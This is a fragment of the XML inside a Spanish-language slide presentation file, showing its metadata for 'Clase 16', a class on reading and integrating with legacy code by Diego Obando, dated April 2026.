            <a:ext cx="8979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Nos vemos el martes 21 de abril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Lectura e Integración con Código Legado</dc:title>
  <dc:subject>Clase 16</dc:subject>
  <dc:creator>Diego Obando</dc:creator>
  <cp:lastModifiedBy>Diego Obando</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-19T20:41:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-19T20:41:49Z</dcterms:modified>
</cp:coreProperties>
</file>